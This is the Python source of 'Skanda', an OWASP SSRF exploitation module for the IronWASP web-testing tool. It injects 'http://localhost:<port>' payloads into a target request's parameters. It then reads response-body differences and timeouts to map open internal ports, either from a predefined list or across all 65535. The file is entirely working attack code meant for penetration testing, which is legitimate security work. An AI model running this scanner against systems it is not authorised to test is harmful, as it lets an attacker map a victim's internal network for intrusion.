#
# Copyright 2013 Jayesh Singh Chauhan
#
# This file is part of Skanda - SSRF Exploitation Framework
#
# Skanda is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, version 3 of the License.
#
# Skanda is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
#  http://www.gnu.org/licenses/
#

from IronWASP import *
import re
import time

#Extend the Module base class
class Skanda(Module):


	#Implement the GetInstance method of Module class. This method is used to create new instances of this module.
	def GetInstance(self):
		m = Skanda()
		m.Name = 'Skanda'
		return m



	#Implement the StartModule method of Module class. This is the method called by IronWASP when user tries to launch the moduule from the UI.
	def StartModuleOnSession(self, sess):
		#IronConsole is a CLI window where output can be printed and user input accepted
		self.console = IronConsole()
		self.console.SetTitle('OWASP Skanda')
		self.console.ConsoleClosing += lambda e: self.close_console(e)
		self.console.ShowConsole()
		#'Print' prints text at the CLI. 'PrintLine' prints text by adding a newline at the end.
		self.console.PrintLine('OWASP Skanda - SSRF Exploitation Framework v0.1')
		self.console.PrintLine('Copyright 2013 Jayesh Singh Chauhan')
		self.console.PrintLine('License : GPL v3 - http://opensource.org/licenses/GPL-3.0')
		self.console.PrintLine('https://github.com/jayeshchauhan/skanda')
		self.console.PrintLine('')
		self.console.Print('[*] Getting scan settings from user...')
		f = Fuzzer.FromUi(sess.Request)
		f.SetLogSource('Skanda')
		if f.HasMore() == False:
			self.console.PrintLine('')
			self.console.PrintLine('[*]You have not any provided scan settings, hence scan cannot proceed. Please close this window ')
			return
		self.console.PrintLine('done!')
		self.console.PrintLine('')
		self.console.PrintLine('Skanda is going to perform port scan on the target server using SSRF')
		self.console.PrintLine('')
		self.print_input_message()
		scan_type = self.console.ReadLine()
		first_input_check = bool(False)
		while first_input_check == False:
				
			if scan_type == '1':
				first_input_check = bool(True)
			elif scan_type == '2':
				first_input_check = bool(True)
			else:
				self.console.PrintLine('')
				self.console.PrintLine('Please enter valid inputs')
				self.print_input_message()
				#'Read' accepts multi-line input from the user through the CLI. 'ReadLine' accepts single line user input.
				scan_type = self.console.ReadLine()
		
		if scan_type == '2':
			self.console.PrintLine('Enter the range of ports to be scanned (Ex: x-y)')
			payloads_input = self.console.ReadLine()
			self.console.PrintLine('Scanning the following port range -> ' + payloads_input)
			# #We are getting the payloads list from user only to demonstarte the user input feature.

			second_input_check = bool(False)
			while second_input_check == False:
				hyphen = "-"
				if hyphen in payloads_input:
					range_str = payloads_input.split(hyphen)
					try:
						lower_range = int(range_str[0])
						higher_range = int(range_str[1])
						second_input_check = True
					except:
						self.console.PrintLine('')
						self.console.PrintLine('Please enter the input in valid format')
						self.console.PrintLine('Enter the range of ports to be scanned (Ex: x-y)')
						payloads_input = self.console.ReadLine()
				else:
					self.console.PrintLine('')
					self.console.PrintLine('Please enter the input in valid format')
					self.console.PrintLine('Enter the range of ports to be scanned (Ex: x-y)')
					payloads_input = self.console.ReadLine()

			port_range = payloads_input.split("-")
		

		self.console.PrintLine('')
		self.console.PrintLine('[*] Starting the scan.')
		self.console.PrintLine('')
		self.console.PrintLine('[*]Performing initial diagnostics. This might take a while')
		self.error_xspa = []
		self.blind_xspa = []
		self.base_req = sess.Request
		avg_res_time = (sess.Request.Send().RoundTrip + sess.Request.Send().RoundTrip + sess.Request.Send().RoundTrip)/3
		timeout = avg_res_time + 5000
		self.console.PrintLine('[*]Diagnostics completed !')
		self.console.PrintLine("[*}Now, let's start port scan")
		self.console.PrintLine('')	
		
		while f.HasMore():
			f.Next()
			
			self.res_1 = f.Inject("http://localhost:1")
			
			res_2= f.Inject("http://localhost:2")
			
			self.body_diff = Tools.DiffLevel(self.res_1.BodyString, res_2.BodyString) + int(5)


			if scan_type == '1':
				ports = [20,21,22,23,25,53,69,79,80,81,105,106,107,110,111,113,115,137,139,143,194,220,389,443,636,944,989,990,1025,1080,2049,2224,8009,8080,8443,8843,8090,14147,63891]
				port_count = len(ports)
				start_time = time.time()
				
				for port in ports:
					self.port_scan(f,port,timeout)
				
				end_time = time.time()
				time_taken = end_time - start_time
				self.console.PrintLine('')
				self.console.PrintLine('Open ports discovered via Blind XSPA - ' + str(self.blind_xspa))
				self.console.PrintLine('Open ports discovered via Error based XSPA - ' + str(self.error_xspa))
				self.console.PrintLine('')
				self.console.PrintLine('The time taken to scan most common ports - ' + str(ports) + ' is -> ' + str("%0.2f" % time_taken) + ' seconds')
				self.console.PrintLine('Now Skanda is going to scan for rest of the ports from 1-65535')
				minutes = (time_taken/port_count) *(65535/60)
				self.console.PrintLine('The scan is going to take approximately - ' + str("%0.2f" % minutes) + ' minutes' )
				self.console.PrintLine('')
				self.console.PrintLine('Please enter any key to continue or press "n" to exit')
				cont = self.console.ReadLine()
				if cont == 'n' or cont == 'N':
					self.console.PrintLine('')
					self.console.PrintLine('[*] Scan Stopped, Please close the window')
					self.console.PrintLine('')
					self.console.PrintLine('Open ports discovered via Blind XSPA - ' + str(self.blind_xspa))
					self.console.PrintLine('Open ports discovered via Error based XSPA - ' + str(self.error_xspa))
					self.StopModule()

				self.console.PrintLine('')
				self.console.PrintLine('Starting scan for rest of the ports 1-65535')
				self.console.PrintLine('')
				
				for port in range(1,65536):
					self.port_scan(f,port,timeout)

			elif scan_type == '2': 
				for port in range(int(port_range[0]),int(port_range[1])+1):
					self.port_scan(f,port,timeout)
					
		self.console.PrintLine('')
		self.console.PrintLine('[*] Scan completed')
		self.console.PrintLine('')
		self.console.PrintLine('Open ports discovered via Blind XSPA - ' + str(self.blind_xspa))
		self.console.PrintLine('Open ports discovered via error based XSPA - ' + str(self.error_xspa))

	def port_scan(self,f,port,timeout):
			
		res=''
		try:
			payload = "http://localhost:" + str(port)
			res = f.Inject(payload,timeout)
		except:
			try:
				base_res = self.base_req.Send(timeout)
			except:
				self.console.PrintLine('There is something wrong with the network. After checking the network, please enter any key to resume')
				ans = self.console.Readline()
				
			try:
				res = f.Inject(payload,timeout)
			except:
				self.console.PrintLine("Port " + (' '*(5-len(str(port)))) + str(port) + " is open (Blind XSPA) ")
				self.blind_xspa.append(str(port))
				return
		port_status = self.check_port_status(res,self.res_1,self.body_diff)
		self.console.PrintLine("Port " + (' '*(5-len(str(port)))) + str(port) + " is " + port_status)
		if port_status == 'Open':
			self.error_xspa.append(str(port))
		
	def check_port_status(self,response1,response2,threshold):
		if 	Tools.DiffLevel(response1.BodyString,response2.BodyString) <= threshold:
			return "Closed"
		else:
			return "Open"

	def print_input_message(self):
		self.console.PrintLine('Select the scan type from below options:')
		self.console.PrintLine('1) Scan Predefined list of ports')
		self.console.PrintLine('2) Accept port list from user and scan them')
		self.console.PrintLine('Enter 1 or 2 below:')
	
	def close_console(self, e):
		#This method terminates the main thread on which the module is running
		self.StopModule()


#This code is executed only once when this new module is loaded in to the memory.
#Create an instance of the this module
m = Skanda()
#Call the GetInstance method on this instance which will return a new instance with all the approriate values filled in. Add this new instance to the list of Modules
Module.Add(m.GetInstance())



